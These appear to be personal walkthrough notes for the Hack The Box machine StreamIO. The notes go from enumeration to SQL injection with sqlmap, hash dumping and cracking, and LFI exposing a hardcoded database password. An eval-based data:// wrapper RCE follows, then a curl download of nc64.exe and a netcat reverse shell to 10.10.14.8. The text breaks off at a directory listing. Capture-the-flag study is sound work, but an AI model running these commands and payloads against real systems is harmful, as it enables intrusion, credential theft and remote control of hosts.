# StreamIO


---
attachments: [Clipboard_2022-09-08-19-41-38.png, Clipboard_2022-09-08-19-44-59.png, Clipboard_2022-09-08-19-51-28.png, Clipboard_2022-09-08-20-16-50.png, Clipboard_2022-09-08-20-19-27.png, Clipboard_2022-09-08-20-20-11.png, Clipboard_2022-09-08-20-26-37.png, Clipboard_2022-09-08-20-29-21.png]
tags: [Import-de76]
title: 'Nmap:'
created: '2022-09-08T18:30:11.242Z'
modified: '2022-09-08T19:52:00.148Z'
---

## Nmap: 

```bash
└─$ nmap -Pn -sV -sC -T4 -oA Nmap 10.10.11.158
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-08 19:26 BST
Nmap scan report for 10.10.11.158 (10.10.11.158)
Host is up (0.11s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-09 01:27:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2022-09-09T01:28:01+00:00; +6h59m55s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m54s, deviation: 0s, median: 6h59m54s
| smb2-time: 
|   date: 2022-09-09T01:27:21
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.07 seconds

```

Checked DNS: 

```bash
└─$ dig AXFR @10.10.11.158 streamIO.htb

; <<>> DiG 9.18.0-2-Debian <<>> AXFR @10.10.11.158 streamIO.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.

```

Checking port 80. It's IIS default page: 

![](@attachment/Clipboard_2022-09-08-19-41-38.png)

Let's perform directory discovery: 

```bash
└─$ feroxbuster -u http://streamio.htb/                                                                                      
200      GET       32l       55w      703c http://streamio.htb/
301      GET        2l       10w      157c http://streamio.htb/aspnet_client => http://streamio.htb/aspnet_client/
301      GET        2l       10w      157c http://streamio.htb/Aspnet_client => http://streamio.htb/Aspnet_client/
301      GET        2l       10w      157c http://streamio.htb/aspnet_Client => http://streamio.htb/aspnet_Client/
301      GET        2l       10w      168c http://streamio.htb/aspnet_client/system_web => http://streamio.htb/aspnet_client/system_web/
301      GET        2l       10w      157c http://streamio.htb/ASPNET_CLIENT => http://streamio.htb/ASPNET_CLIENT/
301      GET        2l       10w      168c http://streamio.htb/Aspnet_client/system_web => http://streamio.htb/Aspnet_client/system_web/
301      GET        2l       10w      168c http://streamio.htb/aspnet_Client/system_web => http://streamio.htb/aspnet_Client/system_web/
301      GET        2l       10w      168c http://streamio.htb/ASPNET_CLIENT/system_web => http://streamio.htb/ASPNET_CLIENT/system_web/
[####################] - 5m    270000/270000  0s      found:9       errors:701    
[####################] - 2m     30000/30000   193/s   http://streamio.htb/ 
[####################] - 2m     30000/30000   192/s   http://streamio.htb/aspnet_client 
[####################] - 2m     30000/30000   166/s   http://streamio.htb/Aspnet_client 
[####################] - 3m     30000/30000   145/s   http://streamio.htb/aspnet_Client 
[####################] - 3m     30000/30000   145/s   http://streamio.htb/aspnet_client/system_web 
[####################] - 3m     30000/30000   148/s   http://streamio.htb/ASPNET_CLIENT 
[####################] - 3m     30000/30000   154/s   http://streamio.htb/Aspnet_client/system_web 
[####################] - 2m     30000/30000   167/s   http://streamio.htb/aspnet_Client/system_web 
[####################] - 2m     30000/30000   226/s   http://streamio.htb/ASPNET_CLIENT/system_web 
                                                                                                           
```

Checking ldap: 

```bash
└─$ ldapsearch -LLL -x -H ldap://streamIO.htb -b'' -s base '(objectclass=\*)'
Operations error (1)
Additional information: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```
Checking port 443: 

![](@attachment/Clipboard_2022-09-08-19-44-59.png)

It's a website that provides movie streaming service. I see an email at the bottom: 

![](@attachment/Clipboard_2022-09-08-19-51-28.png)

`oliver@Streamio.htb`. However, more users in the about.php page: 

![](@attachment/Clipboard_2022-09-08-20-16-50.png)

Doing directory discovery, I found: https://streamio.htb/Admin/

![](@attachment/Clipboard_2022-09-08-20-20-11.png)

But it says forbidden. 

![](@attachment/Clipboard_2022-09-08-20-19-27.png)

Tried to bypass it using a script but I couldn't: 

```bash
└─$ python3 403-bypass.py --url https://streamio.htb/ -p /admin

                                                                                                                                                                       
 ___ ___ ___    _____                                                                                                                                                  
| | |   |_  |  | __  |_ _ ___ ___ ___ ___ ___ ___                                                                                                                      
|_  | | |_  |  | __ -| | | . | .'|_ -|_ -| -_|  _|                                                                                                                     
  |_|___|___|  |_____|_  |  _|__,|___|___|___|_|                                                                                                                       
                     |___|_|                                                                                                                                           

                         @channyeinwai(1.0) 

https://streamio.htb///admin/ : 403
https://streamio.htb///admin/* : 400
https://streamio.htb///admin/%2f/ : 403
https://streamio.htb///admin/./ : 403
https://streamio.htb///admin./. : 404
https://streamio.htb///admin/*/ : 400
https://streamio.htb///admin? : 301
https://streamio.htb///admin?? : 301
https://streamio.htb///admin& : 400
https://streamio.htb///admin# : 301
https://streamio.htb///admin% : 400
https://streamio.htb///admin%20 : 404
https://streamio.htb///admin%09 : 400
https://streamio.htb///admin/..;/ : 404
https://streamio.htb///admin../ : 404
https://streamio.htb///admin..%2f : 404
https://streamio.htb///admin..;/ : 404
https://streamio.htb///admin.././ : 404
https://streamio.htb///admin..%00/ : 400
https://streamio.htb///admin..%0d : 400
https://streamio.htb///admin..%5c : 404
https://streamio.htb///admin..%ff/ : 404
https://streamio.htb///admin%2e%2e%2f : 404
https://streamio.htb///admin.%2e/ : 404
https://streamio.htb///admin%3f : 400
https://streamio.htb///admin%26 : 400
https://streamio.htb///admin%23 : 404
https://streamio.htb///admin.json : 404
https://streamio.htb///admin : 301
https://streamio.htb//*/admin : 400
https://streamio.htb//%2f//admin : 301
https://streamio.htb//.//admin : 301
https://streamio.htb/././admin : 301
https://streamio.htb//*//admin : 400
https://streamio.htb/?/admin : 200
https://streamio.htb/??/admin : 200
https://streamio.htb/&/admin : 400
https://streamio.htb/#/admin : 200
https://streamio.htb/%/admin : 400
https://streamio.htb/%20/admin : 404
https://streamio.htb/%09/admin : 400
https://streamio.htb//..;//admin : 404
https://streamio.htb/..//admin : 301
https://streamio.htb/..%2f/admin : 403
https://streamio.htb/..;//admin : 404
https://streamio.htb/.././/admin : 301
https://streamio.htb/..%00//admin : 400
https://streamio.htb/..%0d/admin : 400
https://streamio.htb/..%5c/admin : 403
https://streamio.htb/..%ff//admin : 404
https://streamio.htb/%2e%2e%2f/admin : 403
https://streamio.htb/.%2e//admin : 403
https://streamio.htb/%3f/admin : 400
https://streamio.htb/%26/admin : 400
https://streamio.htb/%23/admin : 404
https://streamio.htb/.json/admin : 404
https://streamio.htb///admin : (X-Original-URL: /admin) : 301
https://streamio.htb///admin : (X-Custom-IP-Authorization: 127.0.0.1) : 301
https://streamio.htb///admin : (X-Forwarded-For: http://127.0.0.1) : 301
https://streamio.htb///admin : (X-Forwarded-For: 127.0.0.1:80) : 301
https://streamio.htb///admin : (X-rewrite-url: //admin) : 200
https://streamio.htb///admin : X-Forwarded-Host:127.0.0.1) : 301
https://streamio.htb///admin : X-Host:127.0.0.1) : 301
https://streamio.htb///admin : X-Remote-IP:127.0.0.1) : 301
https://streamio.htb///admin : X-Originating-IP:127.0.0.1) : 301
https://streamio.htb///admin : Using GET: 301
https://streamio.htb///admin : Using POST: 405
https://streamio.htb///admin : Using HEAD: 301
https://streamio.htb///admin : Using PUT: 405
https://streamio.htb///admin : Using DELETE: 405
https://streamio.htb///admin : Using PATCH: 405
```

Register: 

![](@attachment/Clipboard_2022-09-08-20-26-37.png)

Account created but when I try to loggedin it says: Login Failed. How?!  

![](@attachment/Clipboard_2022-09-08-20-29-21.png)


Let's do some Vhost discovery using ffuf 

Let's do some Vhost discovery using wfuzz:

```bash
└─$ wfuzz -H "Host: FUZZ.streamio.htb" --hc 404,403 -H "User-Agent: HackTheBox" -c -z file,"/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt"
```

```bash
└─$ wfuzz -H "Host: FUZZ.streamio.htb" --hc 404,403 -H "User-Agent: HackTheBox" -c -z file,"tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt" https://streamio.htb  

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://streamio.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                           
=====================================================================

000002268:   200        78 L     245 W      2829 Ch     "watch"     
```
I added it to /etc/hosts

![](@attachment/Clipboard_2022-09-09-10-20-56.png)

did host discovery on the subdomain but I could'n find anything usefull. 
I had to adapt and search for php files with ferox: 

![](@attachment/Clipboard_2022-09-09-11-01-40.png)

https://watch.streamio.htb/Search.php 


![](@attachment/Clipboard_2022-09-09-11-02-12.png)

I tried SQL Injection, it has to be something with SQL injection for sure but got blocked. 

blocked.php

![](@attachment/Clipboard_2022-09-09-11-02-28.png)

Whenever clicking on a movie a popup shows up. 

![](@attachment/Clipboard_2022-09-09-11-04-07.png)

At this time, I was 90% sure it's a SQL injection in either register or login. 

I tried it on register but failed, tried it on login and it was the there. Try evrything ALWAYS! all I did is to copy the request from burp to file and feed it to sqlmap. 

```bash
└─$ sqlmap -r reqlogin --batch --dump --risk=3 
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6#stable}                                                                                                                                                       
|_ -| . [.]     | .'| . |                                                                                                                                                                    
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:34:34 /2022-09-09/

.......
[11:35:13] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[11:35:25] [INFO] POST parameter 'username' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable 
it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server/Sybase' extending provided level (1) value? [Y/n] Y
[11:35:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:35:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:35:38] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 90 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=admin';WAITFOR DELAY '0:0:5'--&password=a
---
[11:35:57] [INFO] testing Microsoft SQL Server
[11:35:57] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[11:36:03] [INFO] confirming Microsoft SQL Server
[11:36:08] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2019 or 10 or 2016
web application technology: Microsoft IIS 10.0, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
[11:36:08] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[11:36:08] [INFO] fetching current database

```

```bash
12:24:22] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[12:24:22] [INFO] fetching current database
[12:24:22] [INFO] resumed: STREAMIO
[12:24:22] [INFO] fetching tables for database: STREAMIO
[12:24:22] [INFO] fetching number of tables for database 'STREAMIO'
[12:24:22] [INFO] resumed: 2
[12:24:22] [INFO] resumed: dbo.movies
[12:24:22] [INFO] resumed: dbo.users
[12:24:22] [INFO] fetching columns for table 'movies' in database 'STREAMIO'
[12:24:22] [INFO] resumed: 6
[12:24:22] [INFO] resumed: id
[12:24:22] [INFO] resumed: imdb
[12:24:22] [INFO] resumed: metascore
[12:24:22] [INFO] resumed: movie
[12:24:22] [INFO] resumed: votes
[12:24:22] [INFO] resumed: year
[12:24:22] [INFO] fetching entries for table 'movies' in database 'STREAMIO'
[12:24:22] [INFO] fetching number of entries for table 'movies' in database 'STREAMIO'
[12:24:22] [INFO] resumed: 895
```
```bash
└─$ sqlmap -r reqlogin --batch --dump --risk=3 --dbms=MSSQL --dbs dbo.users
        ___
       __H__                                                                                                                                                                                 
 ___ ___[']_____ ___ ___  {1.6#stable}                                                                                                                                                       
|_ -| . [.]     | .'| . |                                                                                                                                                                    
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                 


```


```bash
└─$ sqlmap -r reqlogin --batch -D STREAMIO --dump -T users     
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6#stable}                                                                                                                                                       
|_ -| . [(]     | .'| . |                                                                                                                                                                    
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:38:04 /2022-09-09/

[16:38:04] [INFO] parsing HTTP request from 'reqlogin'
[16:38:04] [INFO] resuming back-end DBMS 'microsoft sql server' 
[16:38:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=admin';WAITFOR DELAY '0:0:5'--&password=a
---
[16:38:05] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2019 or 10 or 2016
web application technology: Microsoft IIS 10.0, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
[16:38:05] [INFO] fetching columns for table 'users' in database 'STREAMIO'
[16:38:05] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                              
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[16:38:29] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
4
[16:38:33] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                     
[16:39:02] [INFO] adjusting time delay to 2 seconds due to good response times
id
[16:39:20] [INFO] retrieved: is_staf
[16:40:53] [ERROR] invalid character detected. retrying..
[16:40:53] [WARNING] increasing time delay to 3 seconds
fa
[16:41:14] [INFO] retrieved: pass
[16:42:32] [ERROR] invalid character detected. retrying..
[16:42:32] [WARNING] increasing time delay to 4 seconds
word
[16:43:48] [INFO] retrieved: use
[16:44:54] [ERROR] invalid character detected. retrying..
[16:44:54] [WARNING] increasing time delay to 5 seconds
[16:45:14] [ERROR] invalid character detected. retrying..
[16:45:14] [WARNING] increasing time delay to 6 seconds
[16:45:37] [ERROR] invalid character detected. retrying..
[16:45:37] [WARNING] increasing time delay to 7 seconds
[16:46:03] [ERROR] invalid character detected. retrying..
[16:46:03] [WARNING] increasing time delay to 8 seconds
rnam
[16:48:10] [ERROR] invalid character detected. retrying..
[16:48:10] [WARNING] increasing time delay to 9 seconds
[16:48:34] [ERROR] invalid character detected. retrying..

```

```bash
Database: STREAMIO
Table: users
[3 entries]
+----+----------+----------------------------------------------------+----------------------------------------------------+
| id | is_staff | password                                           | username                                           |
+----+----------+----------------------------------------------------+----------------------------------------------------+
| 3  | 1        | c660060492d9eddaa8332d89c99c9239                   | James                  "                           |
| 4  | 1        | 925e5408ecb67aea449373d668b7359e                   | Theodore                                           |
| 5  | 1        | 083ffae904143c4796e464dac33c1f7d                   | Samantha                                           |
+----+----------+----------------------------------------------------+----------------------------------------------------+

```

It took ages but here's the final result: 

```bash
+----+----------+----------------+---------------------------------------+
| id | is_staff | username       | password                              |
+----+----------+----------------+---------------------------------------+
|  3 | 1        | James          | c660060492d9edcaa8332d89c99c9239      |
|  4 | 1        | Theodore       | 925e5408ecb67aea449373d668b7359e      |
|  5 | 1        | Samantha       | 083ffae904143c4796e464dac33c1f7d      |
|  6 | 1        | Lauren         | 08344b85b329d7efd611b7a7743e8a09      |
|  7 | 1        | William        | d62be0dc82071bccc1322d64ec5b6c51      |
|  8 | 1        | Sabrina        | f87d3c0d6c8fd686aacc6627f1f493a5      |
|  9 | 1        | Robert         | f03b910e2bd0313a23fdd7575f34a694      |
| 10 | 1        | Thane          | 3577c47eb1e12c8ba021611e1280753c      |
| 11 | 1        | Carmon         | 35394484d89fcfdb3c5e447fe749d213      |
| 12 | 1        | Barry          | 54c88b2dbd7b1a84012fabc1a4c73415      |
| 13 | 1        | Oliver         | fd78db29173a5cf701bd69027cb9bf6b      |
| 14 | 1        | Michelle       | b83439b16f844bd6ffe35c02fe21b3c0      |
| 15 | 1        | Gloria         | 0cfaaaafb559f081df2befbe66686de0      |
| 16 | 1        | Victoria       | b22abb47a02b52d5dfa27fb0b534f693      |
| 17 | 1        | Alexendra      | 1c2b3d8270321140e5153f6637d3ee53      |
| 18 | 1        | Baxter         | 22ee218331afd081b0dcd8115284bae3      |
| 19 | 1        | Clara          | ef8f3d30a856cf166fb8215aca93e9ff      |
| 20 | 1        | Barbra         | 3961548825e3e21df5646cafe11c6c76      |
| 21 | 1        | Lenord         | ee0b8a0937abd60c2882eacb2f8dc49f      |
| 22 | 1        | Austin         | 0049ac57646627b8d7aeaccf8b6a936f      |
| 23 | 1        | Garfield       | 8097cedd612cc37c29db152b6e9edbd3      |
| 24 | 1        | Juliette       | 6dcd87740abb64edfa36d170f0d5450d      |
| 25 | 1        | Victor         | bf55e15b119860a6e6b5a164377da719      |
| 26 | 1        | Lucifer        | 7df45a9e3de3863807c026ba48e55fb3      |
| 27 | 1        | Bruno          | 2a4e2cf22dd8fcb45adcb91be1e22ae8      |
| 28 | 1        | Diablo         | ec33265e5fc8c2f1b0c137bb7b3632b5      |
| 29 | 1        | Robin          | dc332fb5576e9631c9dae83f194f8e70      |
| 30 | 1        | Stan           | 384463526d288edcc95fc3701e523bc7      |
| 31 | 1        | yoshihide      | b779ba15cedfd22a023c4d8bcf5f2332      |
| 33 | 0        | admin          | 665a50ac9eaa781e4f7f04199db97a11      |
+----+----------+----------------+---------------------------------------+
```

Let's crack them all at once using rockyou. 
 I got some of theme cracked: 


 ```bash
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashesToCrack.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 30 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
highschoolmusical (?)     
physics69i       (?)     
paddpadd         (?)     
66boysandgirls.. (?)     
%$clara          (?)     
$monique$1991$   (?)     
$hadoW           (?)     
$3xybitch        (?)     
##123a8j8w5123## (?)     
!?Love?!123      (?)     
!5psycho8!       (?)     
!!sabrina$       (?)     
12g 0:00:00:01 DONE (2022-09-11 12:45) 11.32g/s 13531Kp/s 13531Kc/s 372043KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
 ```
Finnaly managed to login using user `yoshihide` and password `66boysandgirls..`

![](@attachment/Clipboard_2022-09-11-12-52-02.png)

https://streamio.htb/admin/?user=

Another SQL? NO for sure it's a no I already got users. 

Look, whenever you see php extention files, brutforce for parmas. And that's what I did. 

I used arjun because it's fast and support headers:

```bash
└─$ arjun --headers="cookie: PHPSESSID=lrmh4g7uvut8eo3463tjj6kibq" -u https://streamio.htb/admin/           
    _
   /_| _ '                                                                                                                                                             
  (  |/ /(//) v2.1.41                                                                                                                                                  
      _/                                                                                                                                                               

[*] Probing the target for stability
[*] Analysing HTTP response for anamolies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] name: staff, factor: body length
[✓] name: debug, factor: body length
[✓] name: user, factor: body length
[✓] name: movie, factor: body length
                                       
```
beside the known parameters, there's debug which is hidden. 
It gave me this message: 

![](@attachment/Clipboard_2022-09-11-13-09-17.png)

After fuzzing a lot. I had to step back and go back to what I've done before. 

I forgot about this file: https://streamio.htb/admin/master.php

which is not 403 but it says: 

```bash
└─$ curl https://streamio.htb/admin/master.php -k 
<h1>Movie managment</h1>
Only accessable through includes     
```
Maybe it's local file inclusion. Let's take the hint.

Looking at [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) I decided to use a wrapper. 

![](@attachment/Clipboard_2022-09-11-17-42-09.png)

```php

<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>
```

Well it doesn't do too much 

Tried on index. 

![](@attachment/Clipboard_2022-09-11-17-46-21.png)

```php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
```

A password and username. What to do with them? They belond to Database admin. mssqlclinet.py from impacket. port 1443 is filitred so maybe we can connect to it localy but not remotley. 

tried to login within the website streamio.htb but creds are invalide. 
I tried to list shares with smbclient and crackmapexec. 

```bash
└─$ crackmapexec smb 10.10.11.158 -u 'db_admin' -p 'B1@hx31234567890' --users --shares
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\db_admin:B1@hx31234567890 STATUS_LOGON_FAILURE 
```

We can surley connect using winrm because the port is open. 

```bash
└─$ nmap -p 5985 10.10.11.158
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-11 18:59 BST
Nmap scan report for streamIO.htb (10.10.11.158)
Host is up (0.19s latency).

PORT     STATE SERVICE
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds

```

```bash
└─$ evil-winrm -i 10.10.11.158 -u db_admin -p B1@hx31234567890

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

```
Oppss! Creds are non valid. 

Went back again to the LFI, I was missing it. I didn't copy the whole decoded base64

```php


<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
    if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>		
```

## Reverse shell as yoshihide.


Notice the code at the end of the file and the method: eval `file_get_contents`

the function takes the content of the data POSTed via the parameter include and pass it to `eval`. In other words, it evaluates it. 

Found this https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1

So the code above gives us the oppertunity to include php code inside the master.php which we get from the post parameter `include` 

looking at `file_get_contents` I found this in the manuale: https://www.php.net/manual/en/wrappers.data.php

Because I tried to inject normal php shell but didn't work. So we need to pass base64 payload through wrappers. Here's an example from the code below: 

```php
<?php
// prints "I love PHP"
echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo=');
?>
```

Let's do it using curl. We take a payload and conver it to base64

![](@attachment/Clipboard_2022-09-12-15-33-28.png)


```bash
curl -k --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" -H "Cookie: PHPSESSID=irrhssh3g3mmf41mu64v6oei7q" "https://streamio.htb/admin/?debug=master.php&cmd=ls"
```
![](@attachment/Clipboard_2022-09-12-15-34-18.png)


I tried to read the user.txt 

```bash
"https://streamio.htb/admin/?debug=master.php&cmd=type+C:\\Users\yoshihide\Documents\user.txt"
```
Didn't work so I decided to postpone it until I get a shell. 

Let's upload netcat.

```bash
└─$ curl -k --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" -H "Cookie: PHPSESSID=irrhssh3g3mmf41mu64v6oei7q" "https://streamio.htb/admin/?debug=master.php&cmd=curl+http://10.10.14.8:8081/nc64.exe+-o+C:\\ProgramData\\nc64.exe"

```

```bash
└─$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.158 - - [12/Sep/2022 16:16:32] "GET /nc64.exe HTTP/1.1" 200 -
```

Netcat is listening on port 1337

```
curl -s -k --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" -H "Cookie: PHPSESSID=irrhssh3g3mmf41mu64v6oei7q" "https://streamio.htb/admin/?debug=master.php&cmd=cmd+/c+C:\\ProgramData\\nc64.exe+-e+powershell+10.10.14.8+1337
```

Got the shell: 

```bash
└─$ nc -lnvp 1337     
listening on [any] 1337 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.158] 63079
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> ls
ls


    Directory: C:\inetpub\streamio.htb\admin


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/22/2022   2:49 AM                css                                                                   
d-----        2/22/2022   2:49 AM                fonts                                                                 
d-----        2/22/2022   2:49 AM                images                                                                
